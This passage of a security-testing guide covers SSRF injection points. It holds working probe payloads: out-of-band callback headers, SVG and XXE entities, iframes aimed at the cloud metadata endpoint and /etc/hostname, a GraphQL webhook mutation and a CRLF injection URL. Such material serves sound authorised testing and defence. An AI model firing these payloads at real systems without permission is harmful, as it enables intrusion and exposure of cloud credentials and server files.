## Phase 2 — Vectors & injection points

Ordinary pages rarely have SSRF. Features that *fetch on the server's behalf* do.

**High-signal features:** webhooks and "test connection" buttons · link previews/unfurling · import from URL (CSV, images, calendars) · avatar/logo by URL · HTML→PDF / screenshot / export · image and document converters · RSS/Atom readers · SAML/OIDC metadata URLs · cloud storage/CDN integrations · SEO/analytics "check this URL" tools.

**Parameter names:** `url, uri, link, src, source, href, path, dest, destination, redirect, redirect_uri, return, returnUrl, next, continue, target, to, out, view, page, feed, rss, host, domain, site, callback, callbackUrl, webhook, webhookUrl, endpoint, api, proxy, fetch, load, file, document, img, img_url, image, imageUrl, avatar, background, data, reference, referenceUrl, open, import, importUrl, sourceUrl, fetchUrl, targetUrl, devUrl, external`. Also check JSON bodies and nested objects.

**Headers** (unique OAST subdomain per header so you know which fired; Burp's *Collaborator Everywhere* automates this):
```
Referer: http://ref.YOUR_ID.oast.fun/
X-Forwarded-For: xff.YOUR_ID.oast.fun
X-Forwarded-Host: xfh.YOUR_ID.oast.fun
X-Original-URL: http://xou.YOUR_ID.oast.fun
True-Client-IP: tci.YOUR_ID.oast.fun
Client-IP: cip.YOUR_ID.oast.fun
```

**SVG uploads** (server rasterizes to PNG/JPEG):
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://YOUR_ID.oast.fun/svg" height="200" width="200"/>
</svg>
```

**XML / XXE** — SOAP, SAML, RSS import, DOCX/XLSX/SVG uploads:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "http://YOUR_ID.oast.fun/xxe">]>
<r>&x;</r>
```

**HTML→PDF (headless Chrome, wkhtmltopdf):**
```html
<img src="http://YOUR_ID.oast.fun/pdf">
<iframe src="http://169.254.169.254/latest/meta-data/instance-id" width="600" height="100"></iframe>
<iframe src="file:///etc/hostname"></iframe>
```

**Video processing (FFmpeg):** HLS playlists in uploaded media can make FFmpeg fetch segment URLs. Put an OAST URL in the playlist to confirm. (Public PoC: github.com/pflashpunk/ssrf-video.)

**GraphQL:** run introspection, look for String args like `*Url`, `endpoint`, `source`, `webhook`:
```graphql
mutation { setWebhook(url: "http://YOUR_ID.oast.fun/gql") { id } }
```

**WebSocket proxies:** endpoints like `/ws-proxy?target=` — test against your own `ws://` listener first.

**CRLF in outgoing requests:** `/fetch?url=http://allowed.com%0d%0aX-Test:%20YOUR_ID` — confirm the injected header arrives at your listener.

